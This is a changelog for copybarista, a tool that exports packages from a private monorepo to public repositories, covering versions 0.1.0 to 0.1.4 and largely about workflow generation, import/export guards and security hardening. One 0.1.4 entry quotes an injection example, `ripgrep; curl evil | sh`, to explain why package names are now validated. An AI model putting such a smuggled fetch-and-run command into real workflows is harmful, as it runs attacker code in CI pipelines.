# Changelog

All notable copybarista changes are documented here. This project follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## Unreleased

## 0.1.4 - 2026-08-19

### Added

- Generated workflows pin every GitHub Action to a full commit SHA instead of
  a mutable tag, so `@v5` can no longer be repointed at arbitrary code in a
  repository that only receives generated files. The pin table is public as
  `GITHUB_ACTION_PINS` and `action_ref()`, and each entry is at or above its
  first `node24` release, ahead of GitHub retiring the Node 20 runtime.
- `copybarista write-public-workflows <sync_config>` rewrites a package's
  generated `.export/` workflows in place. Both generated files bake in
  `sync.validation_commands`, so editing that list previously meant
  hand-syncing two files or failing the byte-parity check on whichever was
  missed.
- Every generated file now carries a `DO NOT EDIT` banner naming the template
  and sync config that produced it, because hand edits to these files are
  silently overwritten on the next export.
- `sync.validation_commands_comment` renders explanatory YAML comments above
  the generated validation block. Previously the only place to put a comment
  was `validation_commands` itself, where a `#`-leading entry silently never
  ran; that spelling is now rejected outright.
- The `copy.bara.sky` translator accepts `core.replace(regex_groups=...)`,
  dict literals, and `core.transform(ignore_noop=...)`, and reads Copybara's
  `reversal = []` as a forward-only declaration. Whole-line marker deletes can
  only be spelled with interpolated groups in real Copybara, so one config now
  drives both tools.
- `copybarista.template.literal_segments()` returns a template's literal
  skeleton with interpolations replaced, so callers reasoning about the text
  around a `${name}` share this module's grammar instead of restating it.
- Generated workflows cap each job at 45 minutes, cache downloaded apt
  packages, bound and retry `apt-get update`, and retry the export's token
  identity check. A stalled Ubuntu mirror had been consuming the six-hour
  default and reporting only "The operation was canceled".
- Generated export workflows ignore pushes that touch only private paths,
  which every `copy.barista.toml` excludes anyway and which therefore produce
  an identical public tree.
- The vendored `copybarista.lib.testing.resource_markers` helper derives
  pytest timeouts, family markers, and CI skip policy from concrete resource
  markers, and `copybarista.lib.userdirs` plus its autouse
  `isolate_user_dirs` fixture keep tests off the developer's real XDG
  directories. Both ship inside the package so exported repositories keep the
  behavior their own `conftest.py` relies on.

### Changed

- **Removed `sync_setup.DEFAULT_EXCLUDES`.** `config.DEFAULT_PYTHON_EXCLUDES`
  is the single source of truth for Python artifacts and
  `sync_setup.CONTROL_EXCLUDES` separately covers the copybarista control
  files; importers of the combined tuple must compose the two.
- Public-to-source imports auto-merge by default. A clean import carries no
  decision a maintainer can improve, and an unmerged one blocks the export in
  the other direction indefinitely; a conflicting or failing import raises
  before the merge is ever attempted. Set the public repository variable
  `COPYBARISTA_IMPORT_AUTO_MERGE` to `false` to restore manual merges.
- The default validation commands delegate lint, type-check, and test to the
  package's own `pre-commit` hooks rather than restating each tool. Restating
  them meant every newly added hook had to be copied here too, and the copy
  that got forgotten was a check the public repository silently stopped
  running.
- `validation_python_versions` must include the published floor `3.12`.
  Validating only on a newer interpreter left the supported floor untested
  and let 3.13+-only syntax reach PyPI under a `requires-python >=3.12`.
- `system_packages` entries must be Debian package names. They are
  interpolated straight into a workflow `run:` line, so a value like
  `ripgrep; curl evil | sh` previously rendered executable shell into a
  workflow published to a public repository.
- The git clone cache moved from `~/.cache/copybarista/git` to the XDG cache
  directory under `rekursiv-ai/copybarista/git`, which respects
  `XDG_CACHE_HOME` and the platform convention on macOS and Windows. The old
  directory is not migrated and can be deleted.
- A skipped export raises a `::warning::` annotation, and a failed import
  spells out that the export in the other direction stays blocked until an
  import lands. Both exit green, so a project could otherwise stall for days
  with every run reporting success.
- Import PR titles carry the full public SHA rather than an abbreviated one.
  That subject is the ledger the export guard reads back, and an abbreviated
  SHA parsed as no marker at all.
- Forbidden text in `Copybarista-PR-Title`/`-Body` metadata is dropped with a
  warning and the configured default text is used, instead of failing the
  export. A commit message is immutable once pushed, so the old behavior
  wedged every subsequent export until someone hand-advanced
  `replay_bootstrap_base` -- and the remedy was always discarding the same
  description that is now dropped automatically.
- Exports that refresh the public lockfile pass `--upgrade-package` for every
  git-branch dependency. Plain `uv lock` honors the SHA already recorded, so
  a branch-tracking sibling would otherwise be validated and published
  against a stale commit indefinitely.
- `package-validation.yml` is validated by byte-identity against the
  generator rather than by a hand-listed set of fields. The omissions were
  the whole security surface: `on:`, `permissions`, `concurrency`, and
  `runs-on` all passed unexamined, so a hand edit granting `contents: write`
  was accepted.
- The release-tree check matches blocked private names by case-insensitive
  pattern rather than by enumerated substrings, so a spelling nobody listed
  cannot leak into a public tree.

### Fixed

- `check-sync-config` resolves generated workflows under a package's staged
  `.export/` tree, via the new `workflow_dir()`. It had looked only at a bare
  `.github/workflows`, so it rejected every real package while its own tests
  passed against synthetic scaffolds.
- Push-triggered imports resolve the merge baseline from the import ledger
  instead of `github.event.before`. The pushed commit's parent equals the
  last absorbed commit only while every import lands; once one fails, the
  parent marches on and the three-way merge gets a wrong common ancestor,
  manufacturing conflicts that were not real. The generated workflow now
  orders the target checkout before the resolution step, and the config check
  enforces that order.
- A first export no longer force-writes a public repository that already
  holds human-authored commits. "No landed import" was treated as bootstrap
  unconditionally, which is only true when every public commit was written by
  the export itself.
- An import whose merge produced no file changes is still recorded. The
  export guard asks whether the source absorbed a public SHA, not whether
  there was a diff to review, so returning early left it reading "not
  imported" for content the source demonstrably already had.
- `replace` transforms declared reversible are compiled in both directions at
  config-load time. Checking only the forward direction let an `after` that
  drops an interpolated group parse clean and then fail mid-import.
- Each `regex_groups` pattern is validated on its own, not only as part of
  the assembled regex. Concatenation lets a malformed group be re-balanced by
  whatever follows it, so `[unclosed` and `(grp` compiled as a pair while
  Copybara rejected the config outright.
- Marker replacements recover the transform their namespace actually means.
  `:external` uncomment blocks and `if`/`else`/`endif` conditionals were both
  recovered as `strip_block`, which deletes the region the marker exists to
  publish; mismatched or surplus markers are now rejected rather than
  silently trimmed.
- `copy.bara.sky` round-trips no longer emit marker keys onto transforms that
  have none, drop `regex_groups`, or lose an explicit `reversible = false`.
- A `core.move` renaming an origin file is folded into the file copy, so the
  export no longer ships the empty source directory chain Copybara does not
  produce; a rename that would let two origin files claim one destination is
  now rejected instead of colliding at export time.
- The source-root `core.move` is identified among several `origin_files`
  roots, so a package that vendors a renamed subtree is no longer failed as a
  duplicate source-root move.
- The system-package check parses the install step's argv instead of
  substring-searching every stringified step, where a name appearing in a
  comment satisfied the check with no `apt-get` anywhere in the workflow.
  Errors from validating `package-validation.yml` also name that file rather
  than sending operators to `sync-to-source.yml`.

## 0.1.3 - 2026-08-01

### Fixed

- The export no longer force-writes a public repository holding commits the
  source has not absorbed. It walks the span since the last landed import
  and refuses when anything there was written by someone other than the
  export itself, so a released version bump can no longer be silently
  reverted.
- The import ledger reads commit subjects past GitHub's `(#N)` squash-merge
  suffix. Missing it returned a baseline days stale, which both misinformed
  that guard and handed the three-way merge a wrong common ancestor,
  manufacturing conflicts that were not real.
- Package rewrite rules are anchored so their reverse cannot match a bare
  package name inside a URL. Unanchored, importing a public README rewrote
  badge and repository links into dead monorepo paths.
- A guard that cannot determine whether an export is safe now fails closed.

### Added

- Export workflows are generated for every package from one template, and a
  test asserts all of them are byte-identical to their generated form.

- Added source commit metadata replay for generated export PR title and body,
  with source authors represented in generated commit author/co-author metadata.
- Kept ordinary source commit subjects and bodies out of generated PR text
  unless explicit `Copybarista-PR-*` metadata is present.
- Added PR template rendering for generated export PR bodies.
- Added scoped metadata blocks so one source commit can provide different PR
  text for multiple generated package repositories.
- Added `[pull_request]` package sync settings for PR defaults, required
  metadata, replay bootstrap, and public source-revision marker policy.
- Updated generated source export workflows to fetch full source history for
  idempotent PR text replay.

## 0.1.2 - 2026-05-02

- Added transformed-tree leak checks for forbidden paths and text, including
  the `check-leaks` CLI command.
- Added multi-source export assembly with `[[files.copy]]`, destination
  prefixes, and import mapping for copied files.
- Added `move` and `ruff_format` transforms for public tree layout and
  deterministic formatting.
- Hardened GitHub sync scaffolding with validated generated branch namespaces
  and generic source-repo workflow settings.
- Strengthened release-tree validation and added a self-export release
  integration test.
- Expanded export parity coverage and release documentation for multiple
  package sync workflows.

## 0.1.1 - 2026-05-01

- Switched package builds to Hatchling and excluded test modules from wheels.
- Added standalone pre-commit, Codespell, and `ty` checks for contributors.
- Added CI coverage for spelling and `ty` validation.
- Expanded development docs with pre-commit setup and validation commands.
- Refreshed packaging metadata and lockfile for the exported public tree.

## 0.1.0 - 2026-04-30

- Initial public release.
- Added deterministic folder and Git export workflows.
- Added reversible public-change import with verification and rollback.
- Added TOML config support plus supported `copy.bara.sky` translation.
- Added GitHub sync examples, release-tree checks, documentation, and tests.
